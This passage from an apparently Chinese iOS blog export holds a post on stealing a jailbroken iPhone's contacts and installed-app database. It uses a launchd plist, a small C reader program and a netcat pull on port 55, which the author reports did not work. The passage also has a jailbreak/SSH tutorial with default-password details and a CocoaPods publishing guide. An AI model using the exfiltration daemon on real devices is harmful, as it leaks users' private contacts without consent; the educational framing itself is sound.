necessarily be the one who submitted it to launchd. no inetdCompatibility Indicates that the daemon expects to be run as if it were launched by inetd no Program The path to your executable. This key can save the ProgramArguments key for flags and arguments. no onDemand A boolean flag that defines if a job runs continuously or not no RootDirectory The job will be?chrooted?into another directory no ServiceIPC Whether the daemon can speak IPC to launchd no WatchPaths Allows launchd to start a job based on modifications at a file-system path no QueueDirectories Similar to WatchPath, a queue will only watch an empty directory for new files no StartInterval Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs. no StartCalendarInterval Job scheduling. The syntax is similar to cron. no HardResourceLimits Controls restriction of the resources consumed by any job no LowPriorityIO Tells the kernel that this task is of a low priority when doing file system I/O no Sockets An array can be used to specify what socket the daemon will listen on for launch on demand no 配置一个Hack通讯录进程的plist文件 我们需要通过一个plist文件在系统加载时候启动一个进程。 如：一个名为hack的进程，该进程加载的可执行文件hack的路径是/usr/bin/hack。 配置的plist如下： plist源码如下： Program ： 进程可执行文件加载路径 StandardErrorPath ：标准错误路径 ProgramArguments ： 用户登陆后启动的服务路径 inetdCompatibility ：是一个因特网超级服务器(即inetd守护进程）来简化守护进程的编写。 SockServiceName ： Socket通信端口名称 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;!-- hack.plist Created by 曹雪松 on 2018/7/5. Copyright (c) 2018 曹雪松. All rights reserved.--&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Program&lt;/key&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/dev/null&lt;/string&gt; &lt;key&gt;SessionCreate&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;/array&gt; &lt;key&gt;inetdCompatibility&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Wait&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;Sockets&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Listeners&lt;/key&gt; &lt;dict&gt; &lt;key&gt;SockServiceName&lt;/key&gt; &lt;string&gt;55&lt;/string&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/dict&gt;&lt;/plist&gt; 将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 1scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist 读取通讯录 &amp; 用户安装App列表 的执行程序 我们只要能拿出AddressBook.sqlitedb/itunesstored2.sqlitedb就可以拿到用户的数据。 AddressBook的数据都在/var/mobile/Library/AddressBook/AddressBook.sqlitedb中， iTunes Store的数据都在/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb中， 写一个函数用于读取用户通讯录数据库或者用户安装App列表。 12345678910111213141516171819202122232425262728//// hack.c//// Created by 曹雪松 on 2018/7/5.// Copyright © 2018 曹雪松. All rights reserved.//#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#define FILE "/var/mobile/Library/AddressBook/AddressBook.sqlitedb" // 手机的通讯录数据库路径// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // 用户安装app列表文件int main()&#123; int fd = open(FILE, O_RDONLY); // 读数据库文件，返回文件句柄标识 char buf[128]; int ret = 0; if(fd &lt; 0) return -1; while (( ret = read(fd, buf, sizeof(buf))) &gt; 0)&#123; // 将文件读进buff中 write( fileno(stdout), buf, ret); // 写到标准输出中 &#125; close(fd); return 0;&#125; 生成可执行文件 在hack.c所在目录执行，也可以直接指定文件路径 1xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c 可执行文件签名，并传输至iPhone手机/usr/bin目录 12ldid -S hackscp hack root@192.168.1.60:/usr/bin/hack 新开一个终端，SSH连接手机。 获取AddressBook &amp; 用户安装App列表数据 利用netcat，将指定服务端口的数据以文件的形式传输到电脑的当前目录下，抓取设备 AddressBook 或者 用户安装App列表信息。 55为之前plist文件配置的Socket服务名称。 123// 根据自己可执行程序路径，选择获取的数据类型nc 192.168.1.60 55 &gt; addressBook.sqlitedb // 通讯录nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // App列表 利用netcat获取的addressBook.sqlitedb是空的。 使用如下指令监控下过程提示连接拒绝，但是192.168.1.60是可以ping通的。 使用ps aux指令查看所有启动的进程，貌似没有找到我们的hack进程。 暂时还没有找到解决方法，大家可以一起帮忙排查原因。 12nc -v 192.168.1.60 55// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused 如果文件有数据，可以使用string命令查看文件内容 1strings itunesstored2.sqlitedb 参考 iOS攻防——（二）如何窃取用户的通讯录信息 Mac OS启动服务 守护进程和inetd超级服务器 C语言之fileno()函数 对stdin，stdout 和STDOUT_FILENO，STDIN_FILENO的学习 nc命令详解]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（一）： iPhone手机越狱 & SSH]]></title>
    <url>%2Farchives%2Fe38331a.html</url>
    <content type="text"><![CDATA[人在年轻时，最头疼的一件事就是决定自己这一生要做什么。——王小波 《工作与人生》 前言 很早之前就想研究了解一下iOS越狱开发和逆向相关的知识，然后就买了《iOS应用逆向工程》这本’小黄书’，也查了查相关的资料，比较出名的可能就是iOS女神念茜的iOS攻防系列文章了。 但是由于自身的惰性和其他的外界因素，导致’小黄书’翻了几章后就在公司的办公桌上处于长时间的休眠状态，而念茜的文章年代稍微比较久远也在读了两篇后被遗忘在chrome的书签里面，真真的从入门到放弃。🤣 最近这段时间刚好工作行有一些闲暇的时间，偶尔在网上看到《iOS 应用逆向与安全》这本书，这是自“小黄书”后的又一本关于逆向安全的书。随想再从头开始学习下iOS越狱开发和逆向相关的知识，并将学习过程及采坑经验记录于此，希望这一次会有始有终… 这是本系列的第一篇，希望不会成为最后一篇🐒😂 正文 现在Apple公司已经越来越注重开放性，iPhone已经不像几年前那样异常封闭，许多以前只有越狱才有的功能也慢慢的原生自带，越来越多的小伙伴已经没有了当前那种越狱的激情，而随着越来越多的越狱大神隐退、越狱组织解散，辉煌了近10年的越狱也渐渐走向了没落。 但如果想借鉴别人的App某个功能实现思路或者加强我们自己App的安全性，那么最好的途径就是从越狱开发和逆向入手，而这一切的开始的基础：你必须要有一部越狱过的iPhone手机。 所有资料文件&amp;工具在这里 iOS 9x 32位系统越狱配置 机型：iPhone4s 版本：美版 系统：9.3.2 越狱工具 使用Home Depot越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 9.1、iOS 9.2.1、iOS 9.3、iOS 9.3.2、iOS 9.3.3、iOS 9.3.4 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活；但是安装插件Community Offsets后，重启设备越狱也不会失效，可实现完美越狱。 越狱工具请在这里下载 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS9越狱ipa（MixtapePlayer.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到Home Depot的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行Home Depot应用， 点击Prepare for jailbreak， 再依次点击Accept –&gt; Dismiss –&gt; Proceed With Jailbreak –&gt; Begin Installation –&gt; Use Provided Offsets； 等待设备自动重启后，Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 成功后打开Cydia，添加插件源「http://repo.tihmstar.net」，在Cydia中搜索「Community Offsets」并插件安装，安装后即使重启越狱也不会失效，Cydia也不会闪退，相当于完美越狱。 iOS 10x 32位系统越狱配置 机型：iPhone5c 版本：美版 系统：10.3.2 越狱工具 使用h3lix-RC5越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱。 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 10 - 10.3.x 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活； 越狱工具 h3lix Cydia Impactor 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS10x越狱ipa（h3lix-RC5.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到h3lix的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行h3lix应用， 点击屏幕中间的jailbreak， 等待设备自动重启后， 如果提示如下错误，可不用管 Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 插件安装 iphone越狱后就需要安装一些插件来协助进行一些逆向辅助操作。 如果部分需要的插件找不到，可以先尝试添加一些Cydia源。如下是我添加的源地址： tihmstar: http://repo.tihmstar.net多玩源: http://yuan.duowan.comBigBoss: http://apt.thebigboss.org/repofiles/cydia/雷锋源 http://apt.abcydia.com 越狱必备工具(20180702)： openSSH // 远程控制，如远程登录 (如果越狱工具自带Dropbear不需要安装) MobileTerminal // 无法安装 可用MTerminal代替 MTerminal LLVM+Clang // 32位手机需要下载32位的才可以安装，否则无法安装(试了两台手机都没有安装成功，不知道是不是以为32位系统或者16G的缘故) LD64 Darwin CC Tools adv-cmds: 执行 ps 命令报错，需要安装这个工具； iFile: (没有安装成功) 可以安装Filza Filza：在手机上查看文件目录；(必装) Apple File Conduit”2”，安装完后iFunbox等助手软件可以读取手机Root文件 scp：终端命令，把远程设备的文件复制到另一个设备； 还需要的软件： Cydia Translations // 安装后自带 Cydia Substrate // 允许第三方开发者在越狱系统的方法中打一些补丁或扩展方法。 Cydia Installer // 安装后自带 SSHSSH通过WiFi连接手机 OpenSSH原是一个在Linux下很实用的一个软件。iPhone本身就是一个运行BSD系统(可认为是一种Liunx)的硬件，因此，Cydia的作者Saurik把OpenSSH这一软件移植到了iOS平台上，并且简化了安全认证密钥的繁琐，使之成为一款可以在iPhone上运行的Cydia插件。 关于ssh(Secure Shell)详细资料请自行搜索相关资料，可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。 保证你的Mac和iPhone在同一网段 确定iPhone的IP 远程登陆 Terminal输入 1ssh root@xxx.xxx.xxx.xxx // xxx.xxx.xxx.xxx为手机ip地址 如果系统是iOS10.3以上，默认是不能直接使用ssh通过wifi或者USB访问手机的，详情请参考iPhone10.3.X越狱后SSH连接不上的问题（已解决） 1.卸载手机上的OpenSSL和Openssh 2.添加源：http://cydia.ichitaso.com/test 3.搜索并下载：dropbear 4.安装完毕，执行ssh root@deviceIP，默认密码为alpine（也可以在iPhone里下载ssh软件进行连接测试） 5.成功后，再重新安装openssh和OpenSSL了（经测试不会影响SSH连接iPhone）。 第一次连接会提醒你是否连接，输入yes继续，输入密码，初始密码是alpine。 建议将改密码改掉，因为在默认密码的情况下，任何人都可以尝试登陆你的设备。 Ikee, iOS上的一种蠕虫病毒, 通过使用默认密码alpine入侵安装了openssh的越狱设备, 然后所有数据, 包括电话本, 短信, 甚至Apple ID都有可能被窃取.所以强烈建议您修改ssh密码 在登录之后，你可以更改你的密码： 1passwd root // 提示输入两次新密码即可修改 成功后可查看手机文件目录 SSH通过USB连接手机 比WIFI响应速度快，网络环境无限制 usbmuxd是网上开源社区，貌似是国外牛人倾力打造的一个专门针对该功能开源库 通过brew来安装（当然也可以自己去下源码手动安装，由于依赖项比较多，所以很繁琐） 1brew install usbmuxd usbmuxd 自带工具iproxy，iproxy 可以快捷的操作连接iPhone等操作。由于Mac上只支持4位的端口号，所以需要把iPhone的默认端口22映射到Mac上，相当于建立一个Mac和iPhone之间的通道。 12iproxy 7777 22// waiting for connection 以上命令就是把当前连接设备的22端口(SSH端口)映射到电脑的7777端口，那么想和设备22端口通信，直接和本地的7777端口通信就可以了。 终端提示 waiting for connection ，表示这两个端口之间已经可以通信了，保留当前终端(如果关闭就停止端口之间的通信了)，新建另一个终端输入如下指令 1ssh -p 7777 root@127.0.0.1 如果是第一次使用USB连接手机，会提示如下信息，输入yes继续 1234The authenticity of host &apos;[127.0.0.1]:7777 ([127.0.0.1]:7777)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:rBkW26LHWZbqrbfOsrkSCeLN1gr3fADxIF5PWB8VXDI.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[127.0.0.1]:7777&apos; (ECDSA) to the list of known hosts. 如果没有修改过root密码，则输入默认alpine，修改过，则输入修改过密码，完成后即可连接上iPhone。 配置免ssh密码登陆 每次连接手机都需要输入密码比较麻烦，可以通过如下配置免ssh密码登陆 如果本人是做iOS开发的，项目用到了GIT版本控制，一般都配置SSH密钥了。密钥已经存在了电脑的./ssh目录中，如果没有配置，那么可手动重新生成SSH密钥，如: 1ssh-keygen -t rsa -b 4096 -C &quot;your_email&quot; 生成完成后，我们会在./ssh目录中发现id_rsa.pub公钥这个文件。然后我们把它copy出来放到个人目录下，并重命名，比如： 1cp /Users/SevenCho/.ssh/id_rsa.pub ~/authorized_keys 手动SSH进入设备中，或者通过Filza，查看是否存在var/root/.ssh目录，如果没有，我们手动创建下。可通过SSH连接后mkdir创建，或者Filza手动创建。 创建后我们把authorized_keys拷贝到设备中，可利用SCP命令： 1scp ~/authorized_keys root@iphone ip:/var/root/.ssh // iphone ip 为你手机的ip地址 然后按正常连接步骤我们就可以直接SSH连接的时候不用输入密码了。 这个时候，如果我们使用tweak打包时候，也不会再让我们输入SSH密码了。 重置ssh登陆密码 如果你不幸忘记了ssh密码，可以在Cydia中下载Filza软件，通过Filza找到/private/etc/master.password文件，文件中会有以下一段： root:xxxxxxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/shmobile:xxxxxxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh 将root:及mobile:后面的13个x字符处修改成/smx7MYTQIi2M，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine 交叉编译 交叉编译指在一个平台上生成另一个平台上的可执行代码。如我们将会在MAC上编写编译可在iPhone上运行的可执行文件。 编译是由编译器完成的，所以我们首先要找到合适的编译器。关于目前Apple公司开源及很多大公司使用和维护的Clang编译器详细资料请看结构化编译器前端 Clang 介绍 编写代码 12345678touch helloworld.c // 新建c文件open helloworld.c // 打开.c文件，编写测试代码，如下面代码：#include &lt;stdio.h&gt; int main()&#123; printf(&quot;Hello world !!!\n&quot;); return 0; &#125; 生成可执行文件 生成可在iPhone平台运行的二进制可执行文件 iOS的指令集参考文章结尾 12// 格式：xcrun -sdk iphoneos clang -arch armv7s -o [目标文件名] [源文件名]xcrun -sdk iphoneos clang -arch armv7s -o helloworld helloworld.c 传输可执行文件 通过ssh传输本地文件到iPhone（服务器） 12// scp /path/filename username@servername:/path/filenamescp helloworld root@192.168.1.42:/helloworld 关于iOS10.2系统越狱后无法调用scp，可参考[Tutorial] How to fix scp on Yalu / Dropbear 坑：使用iPhone5 iOS10.3 还是无法使用scp传输文件，后来发现因为是32位系统，而使用上面解决方法下载的scp是64位的，手动安装授权32位就可以了，如下 先下载scp二进制文件及相关库文件：scp、libcrypto.0.9.8.dylib、libcrypto.dylib 在电脑上用iTools把scp文件导入到usr/bin目录中，把另外两个文件导入到usr/lib目录中 通过手机MTerminal，登陆进来root模式 进入usr/bin目录，执行下列命令 12ldid -S scpchmod 777 scp 进入usr/lib目录 12chmod 755 libcrypto.0.9.8.dylibchmod 755 libcrypto.dylib 将iPhone（服务器）文件传输到本地 12// scp username@servername:/source/path/filename /des/path/filenamescp root@192.168.1.42:/iphone/path/helloworld /mac/path/helloworld 查看iPhone文件目录是否存在对应文件helloworld，在终端执行可执行文件 传完可执行文件后, 此时可执行文件并没有权限, 所以要执行以下命令给权限: 1chmod a+x helloworld 运行可执行文件 如果执行失败，报Killed: 9，可能是因为执行文件没有签名，使用ldid -S helloworld签名即可。 1./helloworld 注意 如果越狱成功，一定要安装可以远程访问手机的工具，和手机端可以查看越狱系统文件的工具。（以防手贱把Cydia给误删了，需要恢复） 千万要注意：删除某些安装的工具的时候有可能会把Cydia也给一起删除的。 如果想重新使用Apple ID签名越狱, 输入Apple ID账号密码后遇到如下错误 123provision.cpp:81ios/submitDevelopmentCSR =7460You already have a current IOS Development certificate or a pending certificate request. 此时需要删除上一个certificate，操作步骤： 选择菜单栏Xcode -&gt; revokeCertificates 如果revokeCertificates失败，提示如下错误 1progress hpp：87_assert false 下载旧版本Impactor，如Impactor_0.9.42, 使用旧版本软件重新revokeCertificates revokeCertificates成功如下 关于生成可执行文件采用的iOS的指令集 armv6 iPhone、iPhone 3G iPod 1G、iPod 2G armv7 iPhone 3GS、iPhone 4 iPod 3G、iPod 4G、iPod 5G iPad、iPad 2、iPad 3、iPad Mini armv7s iPhone 5、iPhone 5C iPad 4 arm64 iPhone 5S iPhone 6 iPhone 6Plus 以及之后的 iPad Air, Retina iPad Mini 以及之后的 参考 iOS攻防——（一）ssh登陆与交叉编译 《iOS 应用逆向与安全》读后感 不用换ID，完美解决 Cydia Impactor 错误81 iPhone6s 10.3.1越狱失败 提示./plist.hpp:201 not PLIST_STRING 32位设备iOS 10-10.3.x越狱工具h3lix发布 32位设备iOS9.1-9.3.4越狱图文教程 iPhone10.3.X越狱后SSH连接不上的问题（已解决） [Tutorial] How To Access SSH Using Dropbear In iOS 10.3.x To Fix Filza’s Root Permission Using Your Device! SSH Over USB [Tutorial] How to fix scp on Yalu / Dropbear]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建自己的CocoaPods公有库]]></title>
    <url>%2Farchives%2F2e7b1d7b.html</url>
    <content type="text"><![CDATA[我把我整个灵魂都给你，连同它的怪癖，耍小脾气，忽明忽暗，一千八百种坏毛病。它真讨厌，只有一点好，爱你。——王小波《爱你就像爱生命》 前言什么是CocoaPods CocoaPods 是一个 objc/swift 的第三类库依赖管理工具，而其本身是利用 ruby 的依赖管理 gem 进行构建的. 通过CocoaPods工具我们可以为项目添加被称为“Pods”的依赖库（这些类库必须是CocoaPods本身所支持的），并且可以轻松管理其版本。 CocoaPods的好处 1、在引入第三方库时它可以自动为我们完成各种各样的配置，包括配置编译阶段、连接器选项、甚至是ARC环境下的-fno-objc-arc配置等。 2、使用CocoaPods可以很方便地查找新的第三方库，这些类库是比较“标准的”，而不是网上随便找到的，这样可以让我们找到真正好用的类库。 CocoaPods安装 关于CocoaPods安装请自行百度/谷歌，相关资料已经介绍的非常详尽。 更详细的文档请参考官方文档 可以在这里深入理解 CocoaPods 如何制作自己的CocoaPods（公有）库 想要制作自己的CocoaPods（公有）库，我们需要先大概了解一下CocoaPods的两个文件Podfile / Podspec Podfile podfile 是一个文件，用于定义项目所需要使用的第三方库。 该文件支持高度定制，你可以根据个人喜好对其做出定制。更多相关信息，请查阅 Podfile 指南。 Podspec .podspec 也是一个文件，该文件描述了一个库是怎样被添加到工程中的。它支持的功能有：列出源文件、framework、编译选项和某个库所需要的依赖等。 在我们执行pod install 命令加载第三方库的时候, 会先从远程Podspecs仓库拉取最新的包括版本信息在内的所有的第三方库的列表。 存储在本地路径 ~/.cocoapods 中，先显示系统隐藏文件后才可以看到隐藏文件。 1defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder 使用终端进入查看仓库的远程地址 12345cd ~/.cocoapods/repos/mastergit remote -v// 拉取和更新地址origin https://github.com/CocoaPods/Specs.git (fetch)origin https://github.com/CocoaPods/Specs.git (push) https://github.com/CocoaPods/Specs.git 实际就是CocoaPods的GitHub仓库地址。 我们如果一直进入~/.cocoapods/repos/master 就会发现里面的每一个文件夹下都是三方库列表 每一个三方库文件下存放的是对应的版本号文件夹 而对应的版本号文件夹里面则只存在唯一的一个以 三方库名称.podspec.json的文件, 我们看一下GoogleMaps大概的内容 1234567891011121314151617181920&#123; "authors": "Google, Inc.", "description": "Use the Google Maps SDK for iOS to enrich your app with interactive maps, immersive Street View panoramas, and detailed information from Google's Places database.", "homepage": "https://developers.google.com/maps/documentation/ios/", "license": &#123; // 开源协议 // ... &#125;, "name": "GoogleMaps", // 三方库名称 "platforms": &#123; // 三方库平台及版本 "ios": "8.0" &#125;, "preserve_paths": [ // ... ], "source": &#123; "http": "https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz" // 三方库源码 &#125;, "summary": "Google Maps SDK for iOS.", // 三方库描述 "version": "2.7.0", // 三方库版本 &#125; 我们尝试在终端搜索一下第三方库GoogleMaps 1234567891011// pod search GoogleMaps-&gt; GoogleMaps (2.7.0) // 三方库名称 Google Maps SDK for iOS. // 三方库描述 pod &apos;GoogleMaps&apos;, &apos;~&gt; 2.7.0&apos; // 三方库版本 - Homepage: https://developers.google.com/maps/documentation/ios/ - Source: https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz // 三方库源码 - Versions: 2.7.0, 2.6.0, 2.5.0, 2.4.0, 2.3.1, 2.3.0, 2.2.0, 2.1.1, 2.1.0, 2.0.1, 2.0.0, 1.13.2, 1.13.1, 1.13.0, 1.12.3, 1.12.2, 1.12.1, 1.12.0, 1.11.1, 1.11.0, 1.10.5, 1.10.4, 1.10.3, 1.10.2, 1.10.1, 1.10.0, 1.9.2 [master repo] - Subspecs:// ... 我们平时在pod search第三方库后出现的结果其实都是三方库名称.podspec.json这个文件的内容，所以我们只做自己的CocoaPods库，也要从整个文件入手。 正式开始注册 CocoaPods 账号 因为我们的是用CocoaPods统一管理我们的自己的开源库，所以需要一个CocoaPods账号用来发布库。 我们使用终端来进行注册，在终端输入下面的指令、回车： 123// gitHub_email ： 注册CocoaPods的邮箱， 我使用的是和注册GitHub一样的邮箱。// your_user_name ：你注册CocoaPods的用户名 pod trunk register gitHub_email &apos;your_user_name&apos; --verbose 成功后终端输入下面信息，CocoaPods 会发一个确认邮件到你的邮箱上，登录你的邮箱进行确认。 1[!] Please verify the session by clicking the link in the verification email that has been sent to gitHub_email 确认完成后，输入如下指令查看注册信息 12345678// pod trunk me- Name: your_register_name // 你的注册昵称 - Email: your_register_email // 你的注册邮箱 - Since: June 26th, 03:26 - Pods: None - Sessions: - June 26th, 03:26 - November 1st, 03:28. IP: 119.136.114.95 创建Git仓库 在 GitHub 上创建一个公开项目，项目中必须包含这几个文件 LICENSE: 开源许可证 README.md: 库的使用介绍文件 你的开源库代码 你的三方库名称.podspec : CocoaPods 的描述文件，这个文件非常重要 这里我们以我仿写的一个demo为例子,如下图： XSSecurityCodeButton-Demo是一个演示项目 XSSecurityCodeButton是一个演示项目 LICENSE开源许可证，如何创建请自行百度/谷歌，非常简单。 README.md库的使用介绍文件，如何创建请自行百度/谷歌，非常简单。 XSSecurityCodeButton.podspecCocoaPods的描述文件 创建.podspec 进入你需要制作开源库的项目根目录 终端执行下面的指令，会在你的仓库下生成 XSSecurityCodeButton.podspec文件 12345// XSSecurityCodeButton 我的项目名称，请自行修改pod spec create XSSecurityCodeButton// 执行完成生成会输入如下信息Specification created at XSSecurityCodeButton.podspec XSSecurityCodeButton.podspec文件配置及修改请参考下面（已删除部分无用的干扰内容），重要的地方我已经给出注释。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Pod::Spec.new do |s| # ――― Spec Metadata ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.name = "XSSecurityCodeButton" s.version = "0.0.1" # 版本号 与 你仓库的 标签号 对应 s.summary = "XSSecurityCodeButton 是一个简约的验证码按钮." s.description = &lt;&lt;-DESC # 这里的描述，必须比s.summary的长度要长。 DESC s.homepage = "https://github.com/SevenCho/XSSecurityCodeButton" # 你的源码页 # s.screenshots = "www.example.com/screenshots_1.gif", "www.example.com/screenshots_2.gif" # ――― Spec License ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.license = "MIT" # 开源证书 # s.license = &#123; :type =&gt; "MIT", :file =&gt; "FILE_LICENSE" &#125; # ――― Author Metadata ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.author = &#123; "库发布者" =&gt; "邮箱" &#125; # Or just: s.author = "库发布者" # s.authors = &#123; "库发布者" =&gt; "邮箱" &#125; s.social_media_url = "https://sevencho.github.io" // 你的个人网页，如果有的话 # ――― Platform Specifics ――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.platform = :ios s.platform = :ios, "8.0" # 平台及支持的最低版本 # ――― Source Location ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source = &#123; :git =&gt; "https://github.com/SevenCho/XSSecurityCodeButton.git", :tag =&gt; "#&#123;s.version&#125;" &#125; # 你的仓库地址，不能用SSH地址 # ――― Source Code ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source_files = "XSSecurityCodeButton", "XSSecurityCodeButton/**/*.&#123;h,m&#125;" # 你代码的位置， XSSecurityCodeButton/*.&#123;h,m&#125; 表示 XSSecurityCodeButton 文件夹下所有的.h和.m文件 # s.exclude_files = "Classes/Exclude" # 可执行文件 # s.public_header_files = "Classes/**/*.h" # 公共头文件 # ――― Resources ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.resource = "icon.png" # 注意：如果你的代码里包含xib文件，xib属于资源文件，需要resource引入。 # s.resources = "Resources/*.png" # s.preserve_paths = "FilesToSave", "MoreFilesToSave" # ――― Project Linking ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.framework = "SomeFramework" s.frameworks = "UIKit", "Foundation" # 支持的框架 # s.library = "iconv" # s.libraries = "iconv", "xml2" # ――― Project Settings ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.requires_arc = true # 需要ARC支持 # s.xcconfig = &#123; "HEADER_SEARCH_PATHS" =&gt; "$(SDKROOT)/usr/include/libxml2" &#125; # s.dependency "JSONKit", "~&gt; 1.4"end 验证 .podspec 文件的格式是否正确 创建完成.podspec文件并按照上面配置完成，接下来我们就需要文件内容及格式是否正确。 终端执行如下指令： 1pod lib lint 验证通过就会输入如下信息 1XSSecurityCodeButton passed validation. 如果你的项目源码被验证出有警告信息，会输出含有如下内容的信息 1(but you can use `--allow-warnings` to ignore them). 此时你只需要在验证指令后面加上对应的提示，重新验证一遍 1pod lib lint --allow-warnings 给仓库打标签 验证成功后，就需要将仓库提交到远程，然后给仓库打上标签并将标签也推送到远程。 标签相当于是你的仓库的一个压缩包，用于稳定存储当前版本。 标签号与你在 s.version = “0.0.1”的版本号一致0.0.1 1234// 创建标签git tag -a 0.0.1 -m &apos;标签说明&apos; // 推送到远程git push origin --tags 发布.podspec 发布项目的描述的文件, 在项目根目录下执行 1pod trunk push XSSecurityCodeButton.podspec 这一步会执行如下操作： 更新本地 pods 库 ~/.cocoaPods.repo/master 验证.podspec格式是否正确-.podspec 文件转成 JSON 格式 对master仓库 进行合并，提交.master仓库地址 发布成功后输入如下内容： 12345678Updating spec repo `master`-------------------------------------------------------------------------------- 🎉 Congrats 🚀 XSSecurityCodeButton (0.0.1) successfully published 📅 June 26th, 04:13 🌎 https://cocoapods.org/pods/XSSecurityCodeButton // 你发布的cocoapods仓库信息，可在浏览器打开查看 👍 Tell your friends! 使用仓库 先更新本地pods仓库信息 更新完成本地仓库后就可以搜索使用我们自己发布的cocoapods仓库了 就可以在需要的项目的Podfile添加、使用自己的仓库了 123pod setup // 更新pod search XSSecurityCodeButton // 搜索pod &apos;XSSecurityCodeButton&apos;, &apos;~&gt; 0.0.1&apos; // 需要使用的项目的Podfile文件中添加后安装，和使用其他三方库一样 更新维护 当我们维护修改了我们的源码文件后就需要重新发布一个新的版本到cocoapods 项目源码打上对应的标签推送到自己的远程仓库 更新XSSecurityCodeButton.podspec中版本号（和新的标签一致） 重新执行pod trunk push XSSecurityCodeButton.podspec --allow-warnings推送发布到pods仓库]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CocoaPods</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个成功的分支模型]]></title>
    <url>%2Farchives%2F33f710d8.html</url>
